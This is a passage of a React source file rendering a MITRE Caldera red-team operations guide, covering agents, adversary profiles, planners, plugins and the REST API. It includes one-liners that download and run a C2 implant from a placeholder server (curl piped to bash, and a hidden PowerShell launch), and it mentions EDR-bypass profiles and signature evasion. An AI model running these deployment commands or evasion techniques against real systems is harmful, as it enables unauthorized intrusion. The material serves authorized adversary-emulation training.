import { Button } from "@/components/ui/button";
import { Link, useLocation } from "wouter";
import {
  Activity, Users, Key, ExternalLink, Menu, X, Zap, Target, FileText, Cloud,
  Cpu, BookOpen, ChevronDown, ChevronRight, Terminal, Shield, Server,
  AlertTriangle, CheckCircle, Copy, Crosshair, Layers, Network, Eye,
  Globe2,
  Briefcase,
} from "lucide-react";
import { useState } from "react";
import FAQ from '@/components/FAQ';
import { calderaFAQItems } from '@/data/caldera-faq';

import AppShell from "@/components/AppShell";
function Section({ title, icon, children, defaultOpen = false }: { title: string; icon: React.ReactNode; children: React.ReactNode; defaultOpen?: boolean }) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div className="border border-border rounded-lg overflow-hidden mb-4">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center gap-3 px-6 py-4 bg-card hover:bg-secondary/50 transition-colors text-left">
        <span className="text-primary">{icon}</span>
        <span className="font-display tracking-wider text-lg flex-1">{title}</span>
        {open ? <ChevronDown className="w-5 h-5 text-muted-foreground" /> : <ChevronRight className="w-5 h-5 text-muted-foreground" />}
      </button>
      {open && <div className="px-6 py-5 bg-background border-t border-border">{children}</div>}
    </div>
  );
}

function CodeBlock({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <div className="relative group my-3">
      <pre className="bg-card border border-border rounded p-4 text-sm font-mono overflow-x-auto text-green-400">
        <code>{code}</code>
      </pre>
      <button
        onClick={() => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
        className="absolute top-2 right-2 p-1.5 bg-secondary rounded opacity-0 group-hover:opacity-100 transition-opacity"
      >
        {copied ? <CheckCircle className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
      </button>
    </div>
  );
}

function InfoBox({ type, children }: { type: 'tip' | 'warning' | 'important'; children: React.ReactNode }) {
  const styles = {
    tip: 'border-green-500/30 bg-green-500/5 text-green-400',
    warning: 'border-yellow-500/30 bg-yellow-500/5 text-yellow-400',
    important: 'border-blue-500/30 bg-blue-500/5 text-blue-400'
  };
  const icons = {
    tip: <CheckCircle className="w-5 h-5 shrink-0" />,
    warning: <AlertTriangle className="w-5 h-5 shrink-0" />,
    important: <Shield className="w-5 h-5 shrink-0" />
  };
  return (
    <div className={`flex gap-3 p-4 rounded-lg border my-4 ${styles[type]}`}>
      {icons[type]}
      <div className="text-sm leading-relaxed text-foreground">{children}</div>
    </div>
  );
}

export default function CalderaGuide() {
  const [, navigate] = useLocation();

  return (
    <AppShell activePath="/guide/caldera">
{/* Sidebar */}
{/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-3 mb-2">
            <Crosshair className="w-8 h-8 text-primary" />
            <h1 className="font-display text-3xl tracking-wider">CALDERA OPERATIONS GUIDE</h1>
          </div>
          <p className="text-muted-foreground text-lg">Complete guide to adversary emulation, red team operations, and automated attack simulation using MITRE Caldera.</p>
          <p className="text-xs text-muted-foreground mt-2">By Harrison Cook — AceofCloud</p>
        </div>

        {/* Quick Reference */}
        <div className="grid grid-cols-1 md:grid-cols-2 sm:grid-cols-2 lg:grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <div className="bg-card border border-border rounded-lg p-4 text-center">
            <Target className="w-8 h-8 text-primary mx-auto mb-2" />
            <p className="font-display tracking-wider text-sm">ADVERSARIES</p>
            <p className="text-xs text-muted-foreground mt-1">494 profiles loaded</p>
          </div>
          <div className="bg-card border border-border rounded-lg p-4 text-center">
            <Layers className="w-8 h-8 text-primary mx-auto mb-2" />
            <p className="font-display tracking-wider text-sm">ABILITIES</p>
            <p className="text-xs text-muted-foreground mt-1">1,940 techniques</p>
          </div>
          <div className="bg-card border border-border rounded-lg p-4 text-center">
            <Cpu className="w-8 h-8 text-primary mx-auto mb-2" />
            <p className="font-display tracking-wider text-sm">AGENTS</p>
            <p className="text-xs text-muted-foreground mt-1">Multi-platform C2</p>
          </div>
          <div className="bg-card border border-border rounded-lg p-4 text-center">
            <Eye className="w-8 h-8 text-primary mx-auto mb-2" />
            <p className="font-display tracking-wider text-sm">OPERATIONS</p>
            <p className="text-xs text-muted-foreground mt-1">Automated attack chains</p>
          </div>
        </div>

        {/* Section 1: Overview */}
        <Section title="What is MITRE Caldera?" icon={<Shield className="w-5 h-5" />} defaultOpen={true}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            MITRE Caldera is an automated adversary emulation platform that enables red teams to run realistic attack scenarios against target environments. It maps directly to the MITRE ATT&CK framework, allowing you to simulate specific threat actor behaviors (TTPs) and measure your organization's detection and response capabilities.
          </p>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Caldera operates on a client-server model: the <strong className="text-foreground">server</strong> orchestrates operations and stores adversary profiles, while lightweight <strong className="text-foreground">agents</strong> deployed on target systems execute the attack techniques. The server decides which abilities to run based on the adversary profile, the agent's platform, and the operation's planner logic.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">CORE CONCEPTS</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Concept</th><th className="px-4 py-2 text-left border-b border-border">Description</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Ability</td><td className="px-4 py-2 text-muted-foreground">A single ATT&CK technique implementation — a specific command or script that performs one action (e.g., "Enumerate local users via net user")</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Adversary</td><td className="px-4 py-2 text-muted-foreground">An ordered collection of abilities that models a threat actor's behavior — defines the attack chain from initial access to impact</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Agent</td><td className="px-4 py-2 text-muted-foreground">A lightweight implant deployed on target systems that beacons back to the Caldera server and executes abilities</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Operation</td><td className="px-4 py-2 text-muted-foreground">A running campaign that pairs an adversary profile with a group of agents — the actual execution of the attack chain</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Fact</td><td className="px-4 py-2 text-muted-foreground">A piece of information discovered during an operation (hostname, username, file path) that can be used by subsequent abilities</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Planner</td><td className="px-4 py-2 text-muted-foreground">The decision engine that determines which ability to execute next based on available facts and the adversary profile</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Source</td><td className="px-4 py-2 text-muted-foreground">A collection of initial facts provided to an operation (e.g., known IP addresses, credentials, target hostnames)</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">Objective</td><td className="px-4 py-2 text-muted-foreground">The goal condition that determines when an operation is complete (e.g., "exfiltrate file X" or "gain domain admin")</td></tr>
              </tbody>
            </table>
          </div>

          <div className="bg-card border border-border rounded-lg p-4">
            <h4 className="font-display tracking-wider text-sm mb-3 text-primary">OPERATION LIFECYCLE</h4>
            <div className="flex flex-wrap items-center gap-2 text-sm">
              <span className="bg-primary/20 text-primary px-3 py-1 rounded">1. Deploy Agent</span>
              <ChevronRight className="w-4 h-4 text-muted-foreground" />
              <span className="bg-primary/20 text-primary px-3 py-1 rounded">2. Select Adversary</span>
              <ChevronRight className="w-4 h-4 text-muted-foreground" />
              <span className="bg-primary/20 text-primary px-3 py-1 rounded">3. Start Operation</span>
              <ChevronRight className="w-4 h-4 text-muted-foreground" />
              <span className="bg-primary/20 text-primary px-3 py-1 rounded">4. Monitor Chain</span>
              <ChevronRight className="w-4 h-4 text-muted-foreground" />
              <span className="bg-primary/20 text-primary px-3 py-1 rounded">5. Analyze Results</span>
            </div>
          </div>
        </Section>

        {/* Section 2: Agents */}
        <Section title="Deploying Agents" icon={<Cpu className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Agents are the backbone of Caldera operations. They run on target systems, beacon back to the C2 server at configurable intervals, receive instructions, execute abilities, and return results. Caldera supports multiple agent types for different platforms and use cases.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">AGENT TYPES</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Agent</th><th className="px-4 py-2 text-left border-b border-border">Language</th><th className="px-4 py-2 text-left border-b border-border">Platforms</th><th className="px-4 py-2 text-left border-b border-border">Best For</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Sandcat</td><td className="px-4 py-2 text-muted-foreground">GoLang</td><td className="px-4 py-2 text-muted-foreground">Windows, Linux, macOS</td><td className="px-4 py-2 text-muted-foreground">Default agent — cross-platform, feature-rich</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Manx</td><td className="px-4 py-2 text-muted-foreground">GoLang</td><td className="px-4 py-2 text-muted-foreground">Windows, Linux, macOS</td><td className="px-4 py-2 text-muted-foreground">Reverse shell agent with TCP communication</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">Mock</td><td className="px-4 py-2 text-muted-foreground">Python</td><td className="px-4 py-2 text-muted-foreground">Simulated</td><td className="px-4 py-2 text-muted-foreground">Testing without real targets — simulates agent responses</td></tr>
              </tbody>
            </table>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">SANDCAT DEPLOYMENT</h4>
          <p className="text-muted-foreground text-sm mb-3">Deploy a Sandcat agent on the target system using one of these commands:</p>

          <p className="text-xs text-muted-foreground mb-1 font-display tracking-wider">LINUX / macOS:</p>
          <CodeBlock code={`server="http://CALDERA_IP:8888";
curl -s -X POST $server/api/v2/deploy-commands \\
  -H "KEY:CALDERA_API_KEY" \\
  -d '{"platform":"linux","agent_name":"sandcat"}' | bash`} />

          <p className="text-xs text-muted-foreground mb-1 font-display tracking-wider mt-4">WINDOWS (PowerShell):</p>
          <CodeBlock code={`$server="http://CALDERA_IP:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$output="C:\\Users\\Public\\sandcat.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server -group red" -WindowStyle Hidden`} />

          <InfoBox type="tip">
            <strong>Agent Groups:</strong> Use the <code>-group</code> flag to assign agents to groups (e.g., "red", "blue", "finance-targets"). Operations target specific groups, allowing you to run different attack chains against different segments.
          </InfoBox>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary mt-6">AGENT CONFIGURATION OPTIONS</h4>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Option</th><th className="px-4 py-2 text-left border-b border-border">Default</th><th className="px-4 py-2 text-left border-b border-border">Description</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">-server</td><td className="px-4 py-2 text-muted-foreground">http://localhost:8888</td><td className="px-4 py-2 text-muted-foreground">Caldera server address for C2 communication</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">-group</td><td className="px-4 py-2 text-muted-foreground">red</td><td className="px-4 py-2 text-muted-foreground">Agent group assignment for operation targeting</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">-range</td><td className="px-4 py-2 text-muted-foreground">60</td><td className="px-4 py-2 text-muted-foreground">Beacon interval in seconds (how often agent checks in)</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">-v</td><td className="px-4 py-2 text-muted-foreground">false</td><td className="px-4 py-2 text-muted-foreground">Verbose logging for debugging agent issues</td></tr>
              </tbody>
            </table>
          </div>

          <InfoBox type="warning">
            <strong>Dynamic Compilation:</strong> If GoLang is installed on the Caldera server, each agent download is dynamically compiled with a unique hash and randomized process name, helping bypass file-based signature detection.
          </InfoBox>
        </Section>

        {/* Section 3: Adversary Profiles */}
        <Section title="Adversary Profiles" icon={<Target className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Adversary profiles define the attack chain — an ordered sequence of abilities that model a specific threat actor's behavior. Caldera ships with 494 pre-built adversary profiles from the MITRE ATT&CK knowledge base, and you can create custom profiles for specific engagement scenarios.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">YOUR CUSTOM ADVERSARY PROFILES</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Profile</th><th className="px-4 py-2 text-left border-b border-border">Abilities</th><th className="px-4 py-2 text-left border-b border-border">Focus</th><th className="px-4 py-2 text-left border-b border-border">Platforms</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 text-primary">MSP_Target_Complete_APT29_VCD_CrowdStrike</td><td className="px-4 py-2 text-muted-foreground">59</td><td className="px-4 py-2 text-muted-foreground">Full red team exercise: VCD exploitation, CrowdStrike bypass, data exfiltration</td><td className="px-4 py-2 text-muted-foreground">Linux + Windows</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 text-primary">APT29_VCD_Cloud_Compromise_Enhanced</td><td className="px-4 py-2 text-muted-foreground">48</td><td className="px-4 py-2 text-muted-foreground">VMware Cloud Director compromise with APT29 TTPs</td><td className="px-4 py-2 text-muted-foreground">Linux + Windows</td></tr>
                <tr><td className="px-4 py-2 text-primary">MSP_Target_CrowdStrike_Bypass</td><td className="px-4 py-2 text-muted-foreground">12</td><td className="px-4 py-2 text-muted-foreground">EDR evasion focused on CrowdStrike Falcon</td><td className="px-4 py-2 text-muted-foreground">Windows</td></tr>
              </tbody>
            </table>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">CREATING CUSTOM ADVERSARY PROFILES</h4>
          <div className="space-y-3 text-sm text-muted-foreground mb-4">
            <div className="flex gap-3"><span className="bg-primary/20 text-primary px-2 py-0.5 rounded text-xs shrink-0">1</span><span><strong className="text-foreground">Define the scenario:</strong> What threat actor are you emulating? What are their known TTPs? Reference MITRE ATT&CK groups for real-world intelligence.</span></div>
            <div className="flex gap-3"><span className="bg-primary/20 text-primary px-2 py-0.5 rounded text-xs shrink-0">2</span><span><strong className="text-foreground">Select abilities:</strong> Browse the ability library (1,940 available) and pick techniques that match the threat actor's behavior. Order them logically: reconnaissance → initial access → execution → persistence → privilege escalation → lateral movement → exfiltration.</span></div>
            <div className="flex gap-3"><span className="bg-primary/20 text-primary px-2 py-0.5 rounded text-xs shrink-0">3</span><span><strong className="text-foreground">Consider platform:</strong> Ensure abilities match your target platforms. Linux abilities won't execute on Windows agents and vice versa. Place cross-platform abilities first for maximum coverage.</span></div>
            <div className="flex gap-3"><span className="bg-primary/20 text-primary px-2 py-0.5 rounded text-xs shrink-0">4</span><span><strong className="text-foreground">Test incrementally:</strong> Start with a small profile (5-10 abilities) and expand once you verify the chain executes correctly on your target environment.</span></div>
          </div>

          <InfoBox type="important">
            <strong>Ability Ordering Matters:</strong> The atomic planner executes abilities in order. If the first ability requires Windows but your agent is Linux, the entire chain may stall. Always place cross-platform or Linux abilities before Windows-only abilities when targeting mixed environments.
          </InfoBox>
        </Section>

        {/* Section 4: Operations */}
        <Section title="Running Operations" icon={<Eye className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Operations are the execution engine of Caldera. They combine an adversary profile with a group of agents and a planner to automatically execute the attack chain. Operations track every ability execution, collecting results, facts, and timing data.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">OPERATION CONFIGURATION</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Field</th><th className="px-4 py-2 text-left border-b border-border">Description</th><th className="px-4 py-2 text-left border-b border-border">Recommendation</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Name</td><td className="px-4 py-2 text-muted-foreground">Descriptive operation name</td><td className="px-4 py-2 text-muted-foreground">Include date and target (e.g., "APT29-Finance-Q1-2026")</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Adversary</td><td className="px-4 py-2 text-muted-foreground">The adversary profile to execute</td><td className="px-4 py-2 text-muted-foreground">Start with smaller profiles for testing</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Group</td><td className="px-4 py-2 text-muted-foreground">Target agent group</td><td className="px-4 py-2 text-muted-foreground">Match the group your agents are assigned to</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Planner</td><td className="px-4 py-2 text-muted-foreground">Decision engine for ability ordering</td><td className="px-4 py-2 text-muted-foreground">Use "atomic" for sequential, "batch" for parallel</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Obfuscator</td><td className="px-4 py-2 text-muted-foreground">Command obfuscation method</td><td className="px-4 py-2 text-muted-foreground">Use "plain-text" for testing, "base64" for realism</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">Auto-close</td><td className="px-4 py-2 text-muted-foreground">Auto-terminate when complete</td><td className="px-4 py-2 text-muted-foreground">Enable for automated runs, disable for interactive</td></tr>
              </tbody>
            </table>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">PLANNERS</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Planner</th><th className="px-4 py-2 text-left border-b border-border">Behavior</th><th className="px-4 py-2 text-left border-b border-border">Use Case</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Atomic</td><td className="px-4 py-2 text-muted-foreground">Executes abilities one at a time, in order</td><td className="px-4 py-2 text-muted-foreground">Default — predictable, easy to follow</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Batch</td><td className="px-4 py-2 text-muted-foreground">Runs all abilities in parallel per phase</td><td className="px-4 py-2 text-muted-foreground">Faster execution, harder to track</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">Buckets</td><td className="px-4 py-2 text-muted-foreground">Groups abilities by ATT&CK tactic and runs tactic-by-tactic</td><td className="px-4 py-2 text-muted-foreground">Realistic kill chain progression</td></tr>
              </tbody>
            </table>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">OPERATION STATES</h4>
          <div className="grid grid-cols-2 md:grid-cols-2 sm:grid-cols-2 lg:grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 mb-4">
            <div className="bg-card border border-border rounded p-3 text-center">
              <p className="text-lg font-bold text-blue-400">Running</p>
              <p className="text-xs text-muted-foreground">Actively executing abilities</p>
            </div>
            <div className="bg-card border border-border rounded p-3 text-center">
              <p className="text-lg font-bold text-yellow-400">Paused</p>
              <p className="text-xs text-muted-foreground">Waiting for manual resume</p>
            </div>
            <div className="bg-card border border-border rounded p-3 text-center">
              <p className="text-lg font-bold text-green-400">Finished</p>
              <p className="text-xs text-muted-foreground">All abilities completed</p>
            </div>
            <div className="bg-card border border-border rounded p-3 text-center">
              <p className="text-lg font-bold text-red-400">Cleanup</p>
              <p className="text-xs text-muted-foreground">Reversing changes on targets</p>
            </div>
          </div>

          <InfoBox type="tip">
            <strong>Manual Mode:</strong> Start operations in "paused" state and manually approve each ability before execution. This gives you full control during sensitive engagements and allows you to skip abilities that might cause disruption.
          </InfoBox>
        </Section>

        {/* Section 5: Facts & Sources */}
        <Section title="Facts, Sources & Relationships" icon={<Network className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Facts are the intelligence backbone of Caldera operations. As abilities execute, they discover new facts (hostnames, usernames, file paths, credentials) that subsequent abilities can use. This creates a dynamic, adaptive attack chain that mirrors real adversary behavior.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">FACT TYPES</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Trait</th><th className="px-4 py-2 text-left border-b border-border">Description</th><th className="px-4 py-2 text-left border-b border-border">Example Value</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">host.user.name</td><td className="px-4 py-2 text-muted-foreground">Discovered username on target</td><td className="px-4 py-2 text-muted-foreground">administrator</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">host.ip.address</td><td className="px-4 py-2 text-muted-foreground">IP address of discovered host</td><td className="px-4 py-2 text-muted-foreground">192.168.1.100</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">host.process.id</td><td className="px-4 py-2 text-muted-foreground">Running process ID</td><td className="px-4 py-2 text-muted-foreground">4832</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">host.file.path</td><td className="px-4 py-2 text-muted-foreground">File path on target system</td><td className="px-4 py-2 text-muted-foreground">/etc/shadow</td></tr>
                <tr><td className="px-4 py-2 font-mono text-green-400">domain.user.name</td><td className="px-4 py-2 text-muted-foreground">Domain user account</td><td className="px-4 py-2 text-muted-foreground">CORP\admin</td></tr>
              </tbody>
            </table>
          </div>

          <InfoBox type="important">
            <strong>Sources for Pre-Seeding:</strong> Create a Source with known facts before starting an operation. For example, if you know the target network range or specific hostnames, pre-seed these as facts so abilities can use them immediately without needing a discovery phase.
          </InfoBox>
        </Section>

        {/* Section 6: Plugins */}
        <Section title="Essential Plugins" icon={<Layers className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Caldera's functionality is extended through plugins. Each plugin adds abilities, adversaries, agents, or UI features. Plugins are enabled in the <code className="bg-card px-1 rounded">conf/default.yml</code> configuration file.
          </p>

          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Plugin</th><th className="px-4 py-2 text-left border-b border-border">Purpose</th><th className="px-4 py-2 text-left border-b border-border">Key Features</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Stockpile</td><td className="px-4 py-2 text-muted-foreground">Core ability library</td><td className="px-4 py-2 text-muted-foreground">Hundreds of ATT&CK techniques, adversary profiles, and facts</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Atomic</td><td className="px-4 py-2 text-muted-foreground">Atomic Red Team integration</td><td className="px-4 py-2 text-muted-foreground">Imports Atomic Red Team tests as Caldera abilities</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Sandcat</td><td className="px-4 py-2 text-muted-foreground">Default agent</td><td className="px-4 py-2 text-muted-foreground">Cross-platform GoLang agent with dynamic compilation</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Manx</td><td className="px-4 py-2 text-muted-foreground">Reverse shell agent</td><td className="px-4 py-2 text-muted-foreground">TCP-based agent for environments where HTTP is blocked</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Response</td><td className="px-4 py-2 text-muted-foreground">Blue team automation</td><td className="px-4 py-2 text-muted-foreground">Autonomous incident response abilities that fight back</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Compass</td><td className="px-4 py-2 text-muted-foreground">ATT&CK Navigator</td><td className="px-4 py-2 text-muted-foreground">Visualize adversary coverage on the MITRE ATT&CK matrix</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Debrief</td><td className="px-4 py-2 text-muted-foreground">Operation reporting</td><td className="px-4 py-2 text-muted-foreground">Generate detailed reports and visualizations of operations</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">Training</td><td className="px-4 py-2 text-muted-foreground">Interactive tutorials</td><td className="px-4 py-2 text-muted-foreground">Guided training exercises for learning Caldera</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-primary">GameBoard</td><td className="px-4 py-2 text-muted-foreground">Red vs Blue visualization</td><td className="px-4 py-2 text-muted-foreground">Real-time scoreboard for red team vs blue team exercises</td></tr>
                <tr><td className="px-4 py-2 font-mono text-primary">Access</td><td className="px-4 py-2 text-muted-foreground">Initial access attacks</td><td className="px-4 py-2 text-muted-foreground">Phishing, exploit delivery, and initial foothold techniques</td></tr>
              </tbody>
            </table>
          </div>

          <CodeBlock code={`# Enable plugins in conf/default.yml
plugins:
  - stockpile
  - atomic
  - sandcat
  - manx
  - response
  - compass
  - debrief
  - training
  - gameboard
  - access`} />
        </Section>

        {/* Section 7: API Reference */}
        <Section title="REST API Quick Reference" icon={<Terminal className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Caldera provides a comprehensive REST API for programmatic control. All API requests require the <code className="bg-card px-1 rounded">KEY</code> header with your API key. The Cyber Campaign Command dashboard uses this API to display operations, adversaries, and agents.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">COMMON API ENDPOINTS</h4>
          <div className="overflow-x-auto mb-4">
            <table className="w-full text-sm border border-border">
              <thead><tr className="bg-card"><th className="px-4 py-2 text-left border-b border-border">Method</th><th className="px-4 py-2 text-left border-b border-border">Endpoint</th><th className="px-4 py-2 text-left border-b border-border">Description</th></tr></thead>
              <tbody>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">GET</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/agents</td><td className="px-4 py-2 text-muted-foreground">List all agents</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">GET</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/adversaries</td><td className="px-4 py-2 text-muted-foreground">List all adversary profiles</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">GET</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/abilities</td><td className="px-4 py-2 text-muted-foreground">List all abilities</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-green-400">GET</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/operations</td><td className="px-4 py-2 text-muted-foreground">List all operations</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-blue-400">POST</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/operations</td><td className="px-4 py-2 text-muted-foreground">Create a new operation</td></tr>
                <tr className="border-b border-border"><td className="px-4 py-2 font-mono text-yellow-400">PATCH</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/operations/:id</td><td className="px-4 py-2 text-muted-foreground">Update operation (start/pause/stop)</td></tr>
                <tr><td className="px-4 py-2 font-mono text-red-400">DELETE</td><td className="px-4 py-2 font-mono text-muted-foreground">/api/v2/operations/:id</td><td className="px-4 py-2 text-muted-foreground">Delete an operation</td></tr>
              </tbody>
            </table>
          </div>

          <p className="text-xs text-muted-foreground mb-1 font-display tracking-wider">EXAMPLE: LIST ALL AGENTS</p>
          <CodeBlock code={`curl -s -H "KEY:YOUR_API_KEY" http://CALDERA_IP:8888/api/v2/agents | python3 -m json.tool`} />

          <p className="text-xs text-muted-foreground mb-1 font-display tracking-wider mt-4">EXAMPLE: CREATE AN OPERATION</p>
          <CodeBlock code={`curl -s -X POST http://CALDERA_IP:8888/api/v2/operations \\
  -H "KEY:YOUR_API_KEY" \\
  -H "Content-Type: application/json" \\
  -d '{
    "name": "My Red Team Op",
    "adversary": {"adversary_id": "ADVERSARY_ID"},
    "group": "red",
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "auto_close": false
  }'`} />
        </Section>

        {/* Section 8: Best Practices */}
        <Section title="Red Team Best Practices" icon={<Shield className="w-5 h-5" />}>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Running effective red team operations requires careful planning, coordination with stakeholders, and adherence to rules of engagement. Here are proven best practices for using Caldera in professional engagements.
          </p>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">PRE-ENGAGEMENT</h4>
          <div className="space-y-3 text-sm text-muted-foreground mb-6">
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Written authorization:</strong> Always obtain signed rules of engagement (ROE) before any testing. Define scope, timing, and escalation procedures.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Scope definition:</strong> Clearly define in-scope and out-of-scope systems, networks, and techniques. Document any "no-go" areas.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Emergency contacts:</strong> Establish a communication channel with the client's security team for immediate escalation if something goes wrong.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Test environment first:</strong> Run your adversary profile against a lab environment before targeting production systems.</span></div>
          </div>

          <h4 className="font-display tracking-wider text-sm mb-3 text-primary">DURING OPERATIONS</h4>
          <div className="space-y-3 text-sm text-muted-foreground mb-6">
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Monitor continuously:</strong> Watch operation progress in real-time. Be ready to pause or abort if abilities cause unexpected impact.</span></div>
            <div className="flex gap-3"><CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" /><span><strong className="text-foreground">Log everything:</strong> Caldera logs all ability executions, but maintain your own operator notes with timestamps, observations, and decisions.</span></div>
